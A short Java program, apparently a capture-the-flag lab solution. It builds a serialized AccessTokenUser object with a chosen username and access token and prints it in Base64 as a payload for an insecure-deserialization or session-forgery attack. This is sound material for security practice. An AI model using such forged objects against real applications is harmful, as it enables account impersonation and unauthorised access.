package lab.actions.common.Serializable;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }

    public String toString() {
        return this.username + " " + this.accessToken ;
    }
}

public class ctf {
    public static void main(String[] args) throws Exception {
        AccessTokenUser a = new AccessTokenUser("wiener", "test123");
        ByteArrayOutputStream bb = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(bb);
        objectOutputStream.writeObject(a);

        byte[] payload = bb.toByteArray();

        System.out.println("Payload (Base64): " + Base64.getEncoder().encodeToString(payload));
    }
}
